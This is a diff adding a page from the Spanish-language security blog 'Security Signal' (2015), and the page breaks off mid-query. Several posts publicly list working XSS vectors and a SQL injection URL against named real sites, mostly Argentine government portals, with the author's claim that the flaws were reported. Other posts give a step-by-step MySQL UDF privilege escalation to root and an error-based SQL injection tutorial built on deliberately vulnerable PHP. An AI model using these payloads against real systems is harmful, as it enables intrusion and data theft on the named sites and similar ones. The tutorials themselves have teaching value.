@@ -1,0 +1,426 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/posts/10/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-rectorado-utn-bs-as/">XSS Rectorado UTN Bs As</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T23:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:33 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-WEZJy40wxTs/VLYbmU2OabI/AAAAAAAAAKw/Np3L22Xf334/s1600/xss.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-WEZJy40wxTs/VLYbmU2OabI/AAAAAAAAAKw/Np3L22Xf334/s1600/xss.png" height="358" width="640" /></a></div><div style="text-align: left;"><br />Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.</div><br />XSS<br /><br />Sitio: <a href="http://csu.rec.utn.edu.ar/">http://csu.rec.utn.edu.ar</a><br /><br />Vector: <br /><a href="http://csu.rec.utn.edu.ar/docs/php/htsearch.php?words=%3C%2Fi%3E%3Cimg+src%3D.+onerror%3Dalert(/HD_Breaker/)%3E%3C!--">http://csu.rec.utn.edu.ar/docs/php/htsearch.php?words=&lt;%2Fi&gt;&lt;img+src%3D.+onerror%3Dalert(/HD_Breaker/)&gt;&lt;!--</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-wwwciudaddemendozagovar/">XSS www.ciudaddemendoza.gov.ar</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T23:30:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:30 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-_MNVZv36_m4/VLYa47XVjRI/AAAAAAAAAKo/8J-0vNj1P14/s1600/xss.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-_MNVZv36_m4/VLYa47XVjRI/AAAAAAAAAKo/8J-0vNj1P14/s1600/xss.png" height="348" width="640" /></a></div><div style="text-align: center;"><br /></div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />XSS<br /><br />Url del sitio: http://www.ciudaddemendoza.gov.ar/<br /><br />Vector:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; POST:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://www.ciudaddemendoza.gov.ar/buscar<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buscar=&lt;/title&gt;&lt;img src=. onerror="alert(/hdbreaker/)" /&gt;<br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-wwwdiariounocomar/">XSS www.diariouno.com.ar</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T23:13:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:13 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i48.tinypic.com/2ef7zbt.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i48.tinypic.com/2ef7zbt.png" height="358" width="640" /></a></div><div style="text-align: left;"><br />Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.</div><br />XSS<br /><br />Sitio: <a href="http://www.diariouno.com.ar/">http://www.diariouno.com.ar/</a><br /><br />Vector: <br /><a href="http://www.diariouno.com.ar/resultados.html?search=//--%3E%3Cscript%3Ealert(/HD_Breaker/)%3C/script%3E">http://www.diariouno.com.ar/resultados.html?search=//--&gt;&lt;script&gt;alert(/HD_Breaker/)&lt;/script&gt;</a><br /></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-wwwesperanzagovar/">XSS www.esperanza.gov.ar</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T23:10:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:10 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div id="stcpDiv" style="left: -1988px; position: absolute; top: -1999px;"><div style="text-align: left;">Todos  los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos  fallos siguen vigentes es por puro desinterés y mala administración de  los encargados.</div><div style="text-align: left;"></div>- See more at: http://www.securitysignal.tk/2015/01/xss-wwwhankinpatentlawcom.html#sthash.6kimi5ub.dpuf</div><div class="separator" style="clear: both; text-align: center;"><a href="http://i41.tinypic.com/23vxshi.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i41.tinypic.com/23vxshi.png" height="358" width="640" /></a></div><div style="text-align: center;"><br /></div><div id="stcpDiv" style="left: -1988px; position: absolute; top: -1999px;"><div style="text-align: left;">Todos  los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos  fallos siguen vigentes es por puro desinterés y mala administración de  los encargados.</div><div style="text-align: left;"></div>- See more at: http://www.securitysignal.tk/2015/01/xss-wwwhankinpatentlawcom.html#sthash.6kimi5ub.dpuf</div><div id="stcpDiv" style="left: -1988px; position: absolute; top: -1999px;"><div style="text-align: left;">Todos  los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos  fallos siguen vigentes es por puro desinterés y mala administración de  los encargados.</div><div style="text-align: left;"></div>- See more at: http://www.securitysignal.tk/2015/01/xss-wwwhankinpatentlawcom.html#sthash.6kimi5ub.dpuf</div><div id="stcpDiv" style="left: -1988px; position: absolute; top: -1999px;"><div style="text-align: left;">Todos  los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos  fallos siguen vigentes es por puro desinterés y mala administración de  los encargados.</div><div style="text-align: left;"></div>- See more at: http://www.securitysignal.tk/2015/01/xss-wwwhankinpatentlawcom.html#sthash.6kimi5ub.dpuf</div><div id="stcpDiv" style="left: -1988px; position: absolute; top: -1999px;"><div style="text-align: left;">Todos  los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos  fallos siguen vigentes es por puro desinterés y mala administración de  los encargados.</div><div style="text-align: left;"></div>- See more at: http://www.securitysignal.tk/2015/01/xss-wwwhankinpatentlawcom.html#sthash.6kimi5ub.dpuf</div>Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.<br /><br />XSS:<br /><br /><div id="stcpDiv" style="left: -1988px; position: absolute; top: -1999px;"><div style="text-align: left;">Todos  los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos  fallos siguen vigentes es por puro desinterés y mala administración de  los encargados.</div><div style="text-align: left;"></div>- See more at: http://www.securitysignal.tk/2015/01/xss-wwwhankinpatentlawcom.html#sthash.6kimi5ub.dpuf</div>Sitio: <a href="http://www.esperanza.gov.ar/">http://www.esperanza.gov.ar/</a><br /><br />Vector: <br /><a href="http://www.esperanza.gov.ar/index.php?hoja=9148%3Cscript%3Ealert(/HD_Breaker/)%3C/script%3E%3C!--">http://www.esperanza.gov.ar/index.php?hoja=9148&lt;script&gt;alert(/HD_Breaker/)&lt;/script&gt;&lt;!--</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-wwwhankinpatentlawcom/">XSS www.hankinpatentlaw.com</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T23:07:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:07 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://i47.tinypic.com/34y634j.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i47.tinypic.com/34y634j.png" height="358" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Todos los sitios expuestos en  esta sección han sido reportados y hemos ofrecido nuestro servicios para  lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.</div><div style="text-align: left;"><br />XSS:<br /><br />Url del sitio: <a href="http://www.hankinpatentlaw.com/">http://www.hankinpatentlaw.com/</a><br /><br />Vector: <br /><a href="http://www.hankinpatentlaw.com/forms/ProfileEOForm.asp?val1=%27Marc&amp;val2=%27HankinPatentLaw&amp;val3=%27com&amp;to=%3Cimg%20src=.%20onerror=alert(%22HD_Breaker%22)%3E">http://www.hankinpatentlaw.com/forms/ProfileEOForm.asp?val1='Marc&amp;val2='HankinPatentLaw&amp;val3='com&amp;to=&lt;img src=. onerror=alert("HD_Breaker")&gt;</a><br /><br />Autor: hdbreaker</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><br /></div></div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-wwwjusmendozagovar/">XSS www.jus.mendoza.gov.ar</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T23:00:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:00 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i47.tinypic.com/2lkb295.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i47.tinypic.com/2lkb295.png" height="358" width="640" /></a></div><div style="text-align: center;"><br /><div style="text-align: left;">Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en sus sistemas, si estos fallos siguen vigentes es por puro desinterés y mala administración de los encargados.</div><br /></div>Sitio: <a href="http://www.jus.mendoza.gov.ar/">http://www.jus.mendoza.gov.ar/</a><br /><br />Vectores:<br /><br /><a href="http://www.jus.mendoza.gov.ar/dadministracion/rf/consultas/informes_show.php?ano=%3Cscript%3Ealert%28/HD_Breaker/%29%3C/script%3E">http://www.jus.mendoza.gov.ar/dadministracion/rf/consultas/informes_show.php?ano=%3Cscript%3Ealert%28/HD_Breaker/%29%3C/script%3E</a><br /><br /><a href="http://www.jus.mendoza.gov.ar/dadministracion/rf/consultas/ver_documento.php?id_contenido=1%20and%20%3Cscript%3Ealert(/HD_Breaker/)%3C/script%3E">http://www.jus.mendoza.gov.ar/dadministracion/rf/consultas/ver_documento.php?id_contenido=1 and &lt;script&gt;alert(/HD_Breaker/)&lt;/script&gt;</a><br /><br /><a href="http://www.jus.mendoza.gov.ar/prensa/archivo.php?pageNum_rs1=491&amp;totalRows_rs1=%3Cscript%3Ealert(/HD_Breaker/)%3C/script%3E">http://www.jus.mendoza.gov.ar/prensa/archivo.php?pageNum_rs1=491&amp;totalRows_rs1=&lt;script&gt;alert(/HD_Breaker/)&lt;/script&gt;</a><br /><a href="http://www.jus.mendoza.gov.ar/siccom/expedientes/resultados/movimientos_list.php?expediente=1%20and%20%3Cscript%3Ealert(/HD_Breaker/)%3C/script%3E"><br /></a><a href="http://www.jus.mendoza.gov.ar/siccom/expedientes/resultados/movimientos_list.php?expediente=1%20and%20%3Cscript%3Ealert(/HD_Breaker/)%3C/script%3E">http://www.jus.mendoza.gov.ar/siccom/expedientes/resultados/movimientos_list.php?expediente=1 and &lt;script&gt;alert(/HD_Breaker/)&lt;/script&gt;</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/xss-y-sqli-wwwmincytgovar/">XSS Y SQLI www.mincyt.gov.ar</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T22:54:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:54 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content">Con esta entrada quiero iniciar nuestra sección de Show Off, donde se mostraran sitios con distintas vulnerabilidades que hemos reportado, muchas de ellas han sido fixeadas. Pero no todo es color purpura, muchos SysAdmins nunca nos dieron respuesta a los reportes y los fallos siguen vigentes<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i46.tinypic.com/34qpyk9.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i46.tinypic.com/34qpyk9.png" height="358" width="640" /></a></div><div style="text-align: center;"><br /></div>Sitio: <a href="http://www.mincyt.gov.ar/">http://www.mincyt.gov.ar</a><br /><br />Vector:<br /><a href="http://www.mincyt.gov.ar/resultados_busqueda.php?cx=012663929835059603360%3A4cqifzdkrgc&amp;cof=FORID%3A10&amp;ie=UTF-8&amp;q=%3C%2Fdiv%3E%3Cscript%3Ealert(%22HD_Breaker%20-%20URS%22)%3C%2Fscript%3E%3C!--">http://www.mincyt.gov.ar/resultados_busqueda.php?cx=012663929835059603360%3A4cqifzdkrgc&amp;cof=FORID%3A10&amp;ie=UTF-8&amp;q=&lt;%2Fdiv&gt;&lt;script&gt;alert("HD_Breaker - URS")&lt;%2Fscript&gt;&lt;!--</a><br /><br />Buscando un SQLI &amp; XSS:<br /><br />Vector:<br /><a href="http://www.mincyt.gov.ar/busqueda/index.php?Id_modulo=3+union+select+1,2,3,4&amp;Id_idioma=1&amp;Id_tag=136&amp;nombreTag=%3Cscript%3Ealert(%22HD_Breaker%20-%20URS%22)%3C/script%3E">http://www.mincyt.gov.ar/busqueda/index.php?Id_modulo=3+union+select+1,2,3,4&amp;Id_idioma=1&amp;Id_tag=136&amp;nombreTag=%3Cscript%3Ealert(%22HD_Breaker%20-%20URS%22)%3C/script%3E</a><br /><br />Autor: hdbreaker</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/mysql-udf-injection/">Mysql UDF Injection</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T22:08:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:08 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"><a href="http://st-listas.20minutos.es/images/2010-11/262092/2753258_640px.jpg?1290678559" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://st-listas.20minutos.es/images/2010-11/262092/2753258_640px.jpg?1290678559" height="300" width="400" /></a></div><div style="text-align: center;"><br /></div><b>by [Q]3rv[0]</b></div>Una linda manera de elevar privilegios en un sistema comprometido es aprovechando los permisos con los que corren ciertos demonios en el sistema como el servidor mysql.<br /><br />Una de las formas de elevar privilegios es añadir funciones a Mysql y para eso nos valemos de la interface UDF (funciones definidas por el usuario) para esto habra que contar con la libreria necesaria apartir de la cual seran llamadas. <br /><br />Teniendo los privilegios necesarios podremos crear ciertas funciones como sys_eval() la cual nos permitiran ejecutar comandos como usuario root desde la propia db.<br /><br />Ante todo debemos asegurarnos de que la base de datos corre con superprivilegios, miremos el fichero de configuracion en /etc/mysql/my.cnf<br /><br /><pre class="brush: bash"># * Basic Settings<br />#<br />user&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = root<br />pid-file&nbsp;&nbsp;&nbsp; = /var/run/mysqld/mysqld.pid<br />socket&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /var/run/mysqld/mysqld.sock<br />port&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = 3306<br />basedir&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /usr<br />datadir&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /var/lib/mysql<br />tmpdir&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; = /tmp<br />language&nbsp;&nbsp;&nbsp; = /usr/share/mysql/english</pre><br /><br />Descargamos la <span style="color: red;">libreria lib_mysqludf_sys.so</span> dentro del directorio /tmp<br /><br /><pre class="brush: bash">wget https://github.com/mysqludf/lib_mysqludf_sys/raw/master/lib_mysqludf_sys.so</pre><br /><br />Conectamos con las credenciales obtenidas a la base de datos<br /><br /><pre class="brush: bash">mysql -u "user" -p"password" database<br /><br /></pre><br />Creamos la table code<br /><br /><pre class="brush: sql">CREATE TABLE code (codigo blob);</pre><br /><br />Presten atencion al tipo de campo "blob" este sirve para almacenar datos binarios entre otros, esto hara que al momento de volcar el fichero no se produzca un cambio de ciertos caracteres que puedan llegar a generar un error cuando la libreria sea llamada.<br /><br />Insertaremos la libreria en la tabla code<br /><br /><pre class="brush: sql">INSERT INTO code VALUES(load_file('/tmp/lib_mysqludf_sys.so'));</pre><br /><br />Dumpeamos los datos en /usr/lib/mysql/plugin/ que es el directorio desde donde el servidor cargara las librerias.<br /><br /><pre class="brush: sql">SELECT * FROM code INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';</pre><br /><br />Por ultimo creamos la funcion sys_eval()<br /><br /><pre class="brush: sql">CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';</pre><br /><br />Llamamos a&nbsp; dicha función<br /><br /><pre class="brush: sql">select sys_eval('id');<br /><br />+-----------------------------------------+<br />| sys_eval('id')&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br />+-----------------------------------------+<br />| uid=0(root) gid=0(root) groups=0(root)  |<br />|                                         |<br />+-----------------------------------------+<br /><br /></pre><br />Les dejo un video demostrativo que realice en un entorno controlado<br /><br /><center><iframe width="800" height="500" src="//www.youtube.com/embed/uaadERGHstk" frameborder="0" allowfullscreen></iframe></center><br />Saludos! </div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/01/13/destripando-la-logica-de-una-sqli-error/">Destripando La Logica De Una SQLI Error Based</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T19:33:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:33 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-PzccS_B-OBE/VLXjRFz5TfI/AAAAAAAAAKY/aSpqZ5xp9Zo/s1600/error.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-PzccS_B-OBE/VLXjRFz5TfI/AAAAAAAAAKY/aSpqZ5xp9Zo/s1600/error.png" height="235" width="400" /></a></div><div style="text-align: right;"><b>by [Q]3rv[0]</b></div>Comenzamos desde lo basico, explicando por que un script vulnerable debe ser explotado de esta manera y no de otra.<br /><br />&nbsp;Acontinuación el código que se puede apreciar es vulnerable a sql injection.<br /><br /><pre class="brush: php">&lt;?php<br />include("conex.php");<br />$id=$_GET['id'];<br />$consulta2="SELECT id, blog FROM blogs WHERE id=".$id.";";<br />$consulta="SELECT username FROM users WHERE id=".$id.";";<br />$query=mysql_query($consulta, $conexion);<br />$query2=mysql_query($consulta2, $conexion);<br />$dumpeo2=mysql_fetch_array($query2);<br />$dumpeo=mysql_fetch_array($query);<br />if (isset($_GET['id'])) {<br />&nbsp;&nbsp;&nbsp; if (!$dumpeo) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo mysql_error();<br />}<br />&nbsp;&nbsp;&nbsp; elseif (!$dumpeo2) {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo mysql_error();<br />}<br />&nbsp;&nbsp;&nbsp; else {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "&lt;b&gt;Nick: ".$dumpeo['username']."&lt;/b&gt;&lt;p&gt;";<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "&lt;b&gt;Blog: ".$dumpeo2['blog']."&lt;/b&gt;&lt;p&gt;";<br />}<br />}<br />?&gt;<br /><br /></pre>Como podemos ver al buscar la cantidad de columnas que esta seleccionando la consulta nos responde con el siguiente mensaje.  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7NHckzM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7NHckzM.png" height="300" width="640" /></a></div><br />Esto se debe a que el parametro id esta siendo usado en dos consultas diferentes seleccionando ambas distinto numero de columnas <br /><br /><pre class="brush: php">$consulta2="SELECT id, blog FROM blogs WHERE id=".$id.";";<br />$consulta="SELECT username FROM users WHERE id=".$id.";";<br /><br /><br /></pre>Por lo tanto nunca vamos a dar con la cantidad justa, es por eso que hay que recurrir a otro metodo.   <br />La siguiente consulta devela a través del error de "entrada duplicada", el usuario que corre en la base de datos.   <br /><br /><pre class="brush: sql">http://localhost/mysqli-lab/2.php?id=1 union select count(*),concat(user(),floor(rand()*2))x from information_schema.tables group by x limit 0,1--<br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/4Rgf5Pk.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/4Rgf5Pk.png" height="270" width="640" /></a></div><br />Pero que es una entrada dulpicada, por que se produce?  Miremos el siguiente error: <span style="color: red;">Duplicate entry 'root@localhost0' for key 'group_key'</span><br /><br />Nos centraremos en group_key o llave de grupo, el error se debe a que se hayo un mismo valor en la llave de grupo.  <br /><br />Antes que nada entendamos el termino de subquery. <br />Las subconsultas nos permiten optimizar tareas en la base de datos, un ejemplo sencillo, supongamos que queremos seleccionar campos de dos tablas distintas, por un lado tenemos la tabla users y por otro la tabla blogs, para obtener los datos en una sola sentencias seria de la siguiente manera:  <br /><br />Obviamente son usadas para realizar tareas mas elaboradas, como comparaciones entre distintos datos, etc  <br /><br /><pre class="brush: sql">mysql&gt; select username,(select blog from blogs limit 0,1)blog from users limit 0,1; <br /><br />+---------------+-------------------------------------+<br />| username      | blog&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |<br />|+--------------+-------------------------------------+<br />|&nbsp;&nbsp;&nbsp; q3rv0&nbsp; &nbsp;   | http://securitysignal.tk            |<br />+---------------+-------------------------------------+<br /><br />1 row in set (0.00 sec)[/code]<br /></pre><br />Llamemos al vector para volverlo a analizar <br /><br /><pre class="brush: sql">select count(*),concat(user(),floor(rand()*2))x from information_schema.tables group by x limit 0,1--</pre><br />Para lograr un mayor entendimiento y comprensión hay que ir hasta el zotano, por eso vamos a realizar análisis desde la propia db.   <br />Les propongo que dividamos la doble consulta, y expongamos la primera.   <br /><br /><pre class="brush: sql">select count(*) from information_schema.tables group by concat(user(),floor(rand()*2)) limit 0,1;</pre><br />Por logica quedaria asi, por que?  Primero explicare un par de conceptos:<br /><br />floor(rand()*2) : generara dos resultados "0" o "1" de manera aleatoria porque?.<br /><br /><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /></pre><pre class="brush: sql">mysql&gt; select floor(rand()*2);<br /><br />+-----------------+<br />| floor(rand()*2) |<br />+-----------------+<br />|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 |<br />+-----------------+<br />1 row in set (0.00 sec)<br /><br /></pre><pre class="brush: sql">mysql&gt; select 